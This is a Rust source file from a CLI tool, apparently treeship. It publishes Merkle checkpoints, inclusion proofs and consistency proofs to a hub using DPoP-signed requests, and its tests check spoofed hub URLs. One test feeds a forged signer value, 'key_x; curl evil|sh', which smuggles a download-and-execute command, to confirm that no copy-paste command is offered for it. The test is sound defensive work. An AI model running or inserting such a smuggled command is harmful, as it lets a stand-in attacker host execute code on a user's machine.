    match &report.consistency {
        Consistency::Published {
            from_index,
            from_size,
            to_size,
        } => printer.info(&format!(
            "  {} consistency proof published (#{:04} → #{:04}, tree_size {} → {})",
            printer.green("ok"),
            from_index,
            report.index,
            from_size,
            to_size
        )),
        Consistency::NotApplicable(why) => {
            if *why != "first checkpoint" {
                printer.hint(&format!("consistency proof skipped: {why}"));
            }
        }
        Consistency::Failed(e) => printer.hint(&format!("consistency proof not published: {e}")),
    }
    printer.blank();
    if let Some(url) = &report.share_url {
        printer.hint(&format!("{url}  (any artifact is now verifiable via Hub)"));
    }
    printer.blank();
}

pub fn publish(config: Option<&str>, printer: &Printer) -> Result<(), Box<dyn std::error::Error>> {
    let report = publish_report(config, printer)?;
    if printer.format == crate::printer::Format::Json {
        // 0.31.10 wrote nothing at all here on success.
        printer.json(&report.to_json());
    } else {
        print_published(&report, printer);
    }
    Ok(())
}

fn publish_report(
    config: Option<&str>,
    printer: &Printer,
) -> Result<PublishReport, Box<dyn std::error::Error>> {
    let ctx = ctx::open(config)?;

    let (_hub_name, hub_entry) = ctx
        .config
        .resolve_hub(None)
        .map_err(|e| -> Box<dyn std::error::Error> { e.into() })?;

    let endpoint = &hub_entry.endpoint;
    let hub_id = &hub_entry.hub_id;
    let hub_secret_hex = super::hub::resolve_dpop_secret_hex(hub_entry, &ctx.keys)?;

    // 1. Load latest checkpoint
    let checkpoint =
        load_latest_checkpoint()?.ok_or("no checkpoints found -- run: treeship checkpoint")?;

    let cp_index = format!("{:04}", checkpoint.index);
    printer.blank();
    printer.info(&format!("Publishing checkpoint #{} to Hub...", cp_index));

    // 2. POST checkpoint to Hub
    let checkpoint_url = format!("{}/v1/merkle/checkpoint", endpoint);
    let dpop_jwt = build_dpop_jwt(&hub_secret_hex, "POST", &checkpoint_url)?;

    let cp_body = serde_json::json!({
        "root":       checkpoint.root,
        "tree_size":  checkpoint.tree_size,
        "height":     checkpoint.height,
        "signed_at":  checkpoint.signed_at,
        "signer":     checkpoint.signer,
        "signature":  checkpoint.signature,
        "public_key": checkpoint.public_key,
        "index":      checkpoint.index,
        // AUD-18: the exact bytes the signature is over, so the hub can
        // ed25519-verify the checkpoint without re-implementing the versioned
        // canonical in Go. The hub cross-checks the structured fields above
        // against the values embedded in this string.
        "canonical":  checkpoint.canonical_signing_string(),
    });

    let cp_resp: serde_json::Value = ureq::post(&checkpoint_url)
        .set("Authorization", &format!("DPoP {}", hub_id))
        .set("DPoP", &dpop_jwt)
        .send_json(&cp_body)?
        .into_json()?;

    let hub_checkpoint_id = cp_resp["id"]
        .as_i64()
        .ok_or("Hub did not return checkpoint id")?;

    printer.info(&format!(
        "  {} checkpoint received (hub id: {})",
        printer.green("ok"),
        hub_checkpoint_id
    ));

    // 3. Find and publish all proofs for this checkpoint. Proofs are
    // generated from the tree AS IT WAS at the checkpoint (truncated +
    // root-cross-checked by checkpoint_leaves) — the full current tree would
    // yield authentication paths that reconstruct the wrong root whenever
    // artifacts were appended after checkpointing, making the hub serve
    // proofs that verifiably fail for legitimate, in-log artifacts.
    let (cp_tree, artifact_ids) = checkpoint_leaves(&ctx, &checkpoint)?;
    let proof_url = format!("{}/v1/merkle/proof", endpoint);
    let mut published_count = 0u64;
    let mut local_only_count = 0u64;
    let mut first_published_id: Option<&str> = None;

    for (leaf_index, artifact_id) in artifact_ids.iter().enumerate() {
        // Only publish proofs for artifacts within this checkpoint's tree_size
        if leaf_index >= checkpoint.tree_size {
            break;
        }

        let inclusion_proof = match cp_tree.inclusion_proof(leaf_index) {
            Some(p) => p,
            None => continue,
        };

        // Load artifact record for summary
        let record = match ctx.storage.read(artifact_id) {
            Ok(r) => r,
            Err(_) => continue,
        };

        let proof_file = ProofFile {
            artifact_id: artifact_id.clone(),
            artifact_summary: artifact_summary(&record),
            inclusion_proof: inclusion_proof.clone(),
            checkpoint: checkpoint.clone(),
        };

        let proof_json_str = serde_json::to_string(&proof_file)?;

        let dpop_jwt = build_dpop_jwt(&hub_secret_hex, "POST", &proof_url)?;

        let proof_body = serde_json::json!({
            "artifact_id":   artifact_id,
            "checkpoint_id": hub_checkpoint_id,
            "leaf_index":    leaf_index,
            "leaf_hash":     inclusion_proof.leaf_hash,
            "proof_json":    proof_json_str,
        });

        match ureq::post(&proof_url)
            .set("Authorization", &format!("DPoP {}", hub_id))
            .set("DPoP", &dpop_jwt)
            .send_json(&proof_body)
        {
            Ok(_) => {
                published_count += 1;
                first_published_id.get_or_insert(artifact_id);
            }
            Err(ureq::Error::Status(status, response)) => {
                let body: serde_json::Value =
                    response.into_json().unwrap_or(serde_json::Value::Null);
                if is_missing_hub_artifact(status, &body) {
                    local_only_count += 1;
                    continue;
                }
                return Err(format!(
                    "Hub rejected proof for {} with status {}: {}",
                    artifact_id, status, body
                )
                .into());
            }
            Err(e) => return Err(e.into()),
        }
    }

    // 4. Publish a consistency proof from the previous checkpoint (3b): proves
    //    this checkpoint's tree EXTENDS the previous one (append-only, no
    //    rewrite). Best-effort: a failure here never blocks proof publishing.
    let consistency = match publish_consistency(
        &checkpoint,
        &artifact_ids,
        endpoint,
        hub_id,
        &hub_secret_hex,
    ) {
        Ok(c) => c,
        Err(e) => Consistency::Failed(e.to_string()),
    };
    let share_url = first_published_id.map(|id| proof_share_url(endpoint, id));
    Ok(PublishReport {
        index: checkpoint.index,
        root: checkpoint.root.clone(),
        hub_checkpoint_id,
        proofs_published: published_count,
        local_only: local_only_count,
        consistency,
        share_url,
    })
}

/// What to tell a reader whose checkpoint signer is not pinned. Both values
/// come from the checkpoint itself: the public key has already decoded as a
/// 32-byte Ed25519 key (base64url), but `signer` is free text a self-signed
/// forgery controls, so the copy-paste `trust add` line is printed only when
/// it is a well-formed key id; anything else is quoted and gets no command.
fn pin_advice(key_id: &str, public_key: &str) -> String {
    if crate::commands::trust::looks_like_key_id(key_id) {
        format!(
            "checkpoint signer {key_id} is not pinned here. Confirm this key out of band (from the hub operator or a source you trust), then: treeship trust add {key_id} ed25519:{public_key} --kind hub_checkpoint"
        )
    } else {
        format!(
            "checkpoint signer {key_id:?} is not pinned here, and its signer field is not a key id, so no pin command is offered. Its public key is ed25519:{public_key}; confirm it out of band before trusting anything it signed"
        )
    }
}

/// Where the proof just published can be read. The hub serves it at
/// `<endpoint>/v1/merkle/<artifact>`; only the hosted hub (`api.treeship.dev`)
/// has the treeship.dev page. The URL comes from the attached endpoint, never
/// from a default, so a self-hosted hub's proofs are not advertised on
/// treeship.dev (W1-9, CLI-12).
fn proof_share_url(endpoint: &str, artifact_id: &str) -> String {
    let base = endpoint.trim_end_matches('/');
    // The host of the authority: after the scheme, up to the first `/`, `?`
    // or `#`; without any `user:pass@` (the part after the last `@`); without
    // the port; without a trailing root dot. `https://api.treeship.dev:x@evil`
    // is evil's host, not ours.
    let after_scheme = base.split_once("://").map_or(base, |(_, rest)| rest);
    let authority = after_scheme.split(['/', '?', '#']).next().unwrap_or("");
    let hostport = authority.rsplit_once('@').map_or(authority, |(_, h)| h);
    let host = hostport
        .rsplit_once(':')
        .filter(|(_, port)| port.chars().all(|c| c.is_ascii_digit()))
        .map_or(hostport, |(h, _)| h)
        .trim_end_matches('.');
    if host.eq_ignore_ascii_case("api.treeship.dev") {
        format!("https://treeship.dev/merkle?id={artifact_id}")
    } else {
        format!("{base}/v1/merkle/{artifact_id}")
    }
}

/// Load the checkpoint immediately before `index` (i.e. `index - 1`), if it
/// exists on disk. Used to compute the consistency proof from the previous
/// published tree to the current one.
fn load_prev_checkpoint(index: u64) -> Result<Option<Checkpoint>, Box<dyn std::error::Error>> {
    if index == 0 {
        return Ok(None);
    }
    let path = checkpoints_dir()?.join(format!("{:04}.json", index - 1));
    if !path.exists() {
        return Ok(None);
    }
    Ok(Some(serde_json::from_slice(&fs::read(&path)?)?))
}

/// Compute and push the Merkle consistency proof from the previous checkpoint
/// (size `from`) to this one (size `to`), proving the log only appended.
///
/// Correctness is load-bearing here, so the proof is computed over the tree
/// **truncated to exactly `to_size` leaves** (the tree as it was at this
/// checkpoint), and its root is **cross-checked against the checkpoint's own
/// root** before anything is pushed. On any mismatch or degenerate range we
/// skip rather than publish a proof that would not verify. The Hub stores it
/// verbatim; the auditing client re-verifies offline with `verify_consistency`.
fn publish_consistency(
    checkpoint: &Checkpoint,
    artifact_ids: &[String],
    endpoint: &str,
    hub_id: &str,
    hub_secret_hex: &str,
) -> Result<Consistency, Box<dyn std::error::Error>> {
    let Some(prev) = load_prev_checkpoint(checkpoint.index)? else {
        return Ok(Consistency::NotApplicable("first checkpoint"));
    };
    let from_size = prev.tree_size;
    let to_size = checkpoint.tree_size;
    // A consistency proof only makes sense for a forward, non-empty extension
    // whose leaves we actually hold. Each degenerate case says what it is.
    if from_size == 0 {
        return Ok(Consistency::NotApplicable(
            "the previous checkpoint has an empty tree",
        ));
    }
    if from_size > to_size {
        return Ok(Consistency::NotApplicable(
            "the previous checkpoint is larger than this one, so it is not a prefix of it",
        ));
    }
    if to_size > artifact_ids.len() {
        return Ok(Consistency::NotApplicable(
            "this checkpoint covers more leaves than the store holds",
        ));
    }

    // Rebuild the tree EXACTLY as it was at this checkpoint (first `to_size`
    // leaves), so the proof's upper tree matches the published checkpoint.
    let mut cp_tree = MerkleTree::new();
    for id in &artifact_ids[..to_size] {
        cp_tree.append(id);
    }
    // Cross-check: the truncated tree's root MUST equal the checkpoint's root.
    // If it does not (e.g. artifacts changed since checkpointing), skip rather
    // than push a proof that cannot verify.
    let computed_root = match cp_tree.root() {
        Some(r) => hex::encode(r),
        None => return Ok(Consistency::NotApplicable("empty tree")),
    };
    let cp_root = checkpoint
        .root
        .strip_prefix("sha256:")
        .unwrap_or(&checkpoint.root);
    if computed_root != cp_root {
        return Ok(Consistency::NotApplicable(
            "tree does not match checkpoint root (re-checkpoint before publishing)",
        ));
    }

    let Some(proof) = cp_tree.consistency_proof(from_size) else {
        return Ok(Consistency::NotApplicable(
            "no consistency proof for this extension",
        ));
    };

    let from_root = prev.root.strip_prefix("sha256:").unwrap_or(&prev.root);
    let url = format!("{}/v1/merkle/consistency", endpoint);
    let dpop_jwt = build_dpop_jwt(hub_secret_hex, "POST", &url)?;
    let body = serde_json::json!({
        "signer":     checkpoint.signer,
        "from_size":  from_size,
        "from_root":  from_root,
        "to_size":    to_size,
        "to_root":    cp_root,
        "version":    checkpoint.merkle_version,
        "proof_json": serde_json::to_string(&proof)?,
        "signed_at":  checkpoint.signed_at,
    });
    ureq::post(&url)
        .set("Authorization", &format!("DPoP {}", hub_id))
        .set("DPoP", &dpop_jwt)
        .send_json(&body)?;

    Ok(Consistency::Published {
        from_index: prev.index,
        from_size,
        to_size,
    })
}

// ---------------------------------------------------------------------------
// DPoP JWT builder (mirrors hub.rs)
// ---------------------------------------------------------------------------

fn build_dpop_jwt(
    hub_secret_hex: &str,
    method: &str,
    url: &str,
) -> Result<String, Box<dyn std::error::Error>> {
    let secret_bytes = hex::decode(hub_secret_hex)?;
    let secret_arr: [u8; 32] = secret_bytes
        .try_into()
        .map_err(|_| "hub secret key must be 32 bytes")?;
    let signing_key = SigningKey::from_bytes(&secret_arr);

    let header = serde_json::json!({
        "alg": "EdDSA",
        "typ": "dpop+jwt",
    });
    let header_b64 = URL_SAFE_NO_PAD.encode(serde_json::to_vec(&header)?);

    let now = SystemTime::now().duration_since(UNIX_EPOCH)?.as_secs();

    let mut jti_bytes = [0u8; 16];
    rand::rngs::OsRng.fill_bytes(&mut jti_bytes);
    let jti = hex::encode(jti_bytes);

    let payload = serde_json::json!({
        "iat": now,
        "jti": jti,
        "htm": method,
        "htu": url,
    });
    let payload_b64 = URL_SAFE_NO_PAD.encode(serde_json::to_vec(&payload)?);

    let message = format!("{}.{}", header_b64, payload_b64);
    let signature = signing_key.sign(message.as_bytes());
    let sig_b64 = URL_SAFE_NO_PAD.encode(signature.to_bytes());

    Ok(format!("{}.{}.{}", header_b64, payload_b64, sig_b64))
}

#[cfg(test)]
mod publish_tests {
    use super::{is_missing_hub_artifact, pin_advice, proof_share_url};

    #[test]
    fn proof_share_url_follows_the_attached_hub() {
        // Only the hosted hub has the treeship.dev page.
        for hosted in [
            "https://api.treeship.dev",
            "https://API.treeship.dev/",
            "https://api.treeship.dev:443",
        ] {
            assert_eq!(
                proof_share_url(hosted, "art_1"),
                "https://treeship.dev/merkle?id=art_1"
            );
        }
        // A self-hosted hub serves its own proofs at /v1/merkle/<id>.
        assert_eq!(
            proof_share_url("https://hub.example.com/", "art_1"),
            "https://hub.example.com/v1/merkle/art_1"
        );
        assert_eq!(
            proof_share_url("http://127.0.0.1:8080", "art_1"),
            "http://127.0.0.1:8080/v1/merkle/art_1"
        );
        // A look-alike host is not the hosted hub.
        assert_eq!(
            proof_share_url("https://api.treeship.dev.evil.example", "art_1"),
            "https://api.treeship.dev.evil.example/v1/merkle/art_1"
        );
        // userinfo is not the host: this URL's host is evil.com.
        for evil in [
            "https://api.treeship.dev:x@evil.com",
            "https://api.treeship.dev@evil.com",
            "https://user:pw@evil.com/?h=api.treeship.dev",
        ] {
            assert!(
                !proof_share_url(evil, "art_1").starts_with("https://treeship.dev/"),
                "{evil}"
            );
        }
        // A trailing root dot and a query are still the hosted hub.
        for hosted in ["https://api.treeship.dev./", "https://api.treeship.dev?x=1"] {
            assert_eq!(
                proof_share_url(hosted, "art_1"),
                "https://treeship.dev/merkle?id=art_1",
                "{hosted}"
            );
        }
    }

    #[test]
    fn pin_advice_offers_a_command_only_for_a_key_id() {
        let ok = pin_advice("key_0123456789abcdef", "AAAA");
        assert!(
            ok.contains(
                "then: treeship trust add key_0123456789abcdef ed25519:AAAA --kind hub_checkpoint"
            ),
            "{ok}"
        );
        assert!(!ok.contains("--yes"), "{ok}");
        // A self-signed forgery controls the signer field.
        let evil = pin_advice("key_x; curl evil|sh", "AAAA");
        assert!(!evil.contains("treeship trust add"), "{evil}");
        assert!(evil.contains("\"key_x; curl evil|sh\""), "{evil}");
    }

    #[test]
    fn only_missing_artifact_404_is_skippable() {
        assert!(is_missing_hub_artifact(
            404,
            &serde_json::json!({"error": "artifact not found"})
        ));
        assert!(!is_missing_hub_artifact(
            404,
            &serde_json::json!({"error": "checkpoint not found"})
        ));
        assert!(!is_missing_hub_artifact(
            403,
            &serde_json::json!({"error": "artifact not found"})
        ));
    }
}
